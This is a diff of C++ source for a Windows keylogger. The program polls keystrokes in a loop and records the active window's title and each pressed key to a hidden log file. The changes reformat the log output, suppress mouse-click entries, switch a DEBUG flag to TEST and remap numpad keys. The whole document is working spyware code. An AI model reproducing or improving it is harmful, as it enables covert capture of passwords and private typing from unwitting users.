@@ -20,7 +20,8 @@
 
 
 #include "main.h"
-#define DEBUG
+#include <cstdio>
+#define TEST
 
 using namespace std;
 
@@ -29,7 +30,7 @@ int main(int argc, char *argv[]){
 	puts(PROJECT_COPYRIGHT);
 	puts("");
 	
-#ifndef DEBUG
+#ifndef TEST
 	char path[260];
 
     GetModuleFileName(NULL,path,260);
@@ -58,35 +59,34 @@ int main(int argc, char *argv[]){
 	ofstream klogout(filepath);
 	
 	//SHORT lastc = 0;
+	int space;
+	int lentitle;
 	while(1){
 		Sleep(2); // give other programs time to run
 		
 		// get the active windowtitle
-		char title[1024];
+		char title[1024],*ptitle;
+		ptitle=title;
 		HWND hwndHandle = GetForegroundWindow();
 		GetWindowText(hwndHandle, title, 1023);
-		if(lastTitle != title){
-			klogout << endl << endl << "Window: ";
+		space=0;
+		lentitle=strlen(title);
+		for (int i = 0; i < lentitle; i++)
+			if(title[i]==' ')
+				space=i;
+		ptitle = title+space;
+		if(lastTitle != title){		
+			if(lentitle == 0){
+				klogout << endl << "NO_ACTIVE ";
 #ifdef DEBUG
-			cout << endl << endl << "Window: ";
+				cout << endl << "NO_ACTIVE ";
 #endif
-			if(strlen(title) == 0){
-				klogout << "NO ACTIVE WINDOW";
+			}else{
+				klogout << endl << ptitle <<" ";
 #ifdef DEBUG
-				cout << "NO ACTIVE WINDOW";
+				cout << endl << ptitle <<" ";
 #endif
 			}
-			else{
-				klogout << "'" << title << "'";
-#ifdef DEBUG
-				cout << "'" << title << "'";
-#endif
-			}
-			klogout << endl;
-#ifdef DEBUG
-			cout << endl;
-#endif
-			
 			lastTitle = title;
 		}
 		
@@ -96,11 +96,11 @@ int main(int argc, char *argv[]){
 			if(rv & 1){ // on press button down
 				string out = "";
 				if(c == 1)
-					out = "[LMOUSE]"; // mouse left
+					out = "";
 				else if(c == 2)
-					out = "[RMOUSE]"; // mouse right
-				else if(c == 4)
-					out = "[MMOUSE]"; // mouse middle
+					out = "";
+				else if(c == 3)
+					out = "";
 				else if(c == 13)
 					out = "[RETURN]";
 				else if(c == 16 || c == 17 || c == 18)
@@ -108,7 +108,7 @@ int main(int argc, char *argv[]){
 				else if(c == 160 || c == 161) // lastc == 16
 					out = "[SHIFT]";
 				else if(c == 162 || c == 163) // lastc == 17
-					out = "[STRG]";
+					out = "[CTRL]";
 				else if(c == 164) // lastc == 18
 					out = "[ALT]";
 				else if(c == 165)
@@ -147,15 +147,15 @@ int main(int argc, char *argv[]){
 				else if(c == 91 || c == 92)
 					out = "[WIN]";
 				else if(c >= 96 && c <= 105)
-					out = "[NUM " + intToString(c - 96) + "]";
+					out = intToString(c - 96);
 				else if(c == 106)
-					out = "[NUM /]";
+					out = "/";
 				else if(c == 107)
-					out = "[NUM +]";
+					out = "+";
+				else if(c == 108)
+					out = "-";
 				else if(c == 109)
-					out = "[NUM -]";
-				else if(c == 109)
-					out = "[NUM ,]";
+					out = ",";
 				else if(c >= 112 && c <= 123)
 					out = "[F" + intToString(c - 111) + "]";
 				else if(c == 144)
@@ -180,13 +180,13 @@ int main(int argc, char *argv[]){
 					out = "<";
 				
 				else
-					out = "[KEY \\" + intToString(c) + "]";
+					out = "["+intToString(c)+"]";
 				
 #ifdef DEBUG
-				cout << ">" << out << "< (" << (unsigned)c << ")" << endl;
+					cout << out;
 #endif
-				klogout << out;
-				klogout.flush();
+					klogout << out;
+					klogout.flush();
 				
 				//lastc = c;
 			}
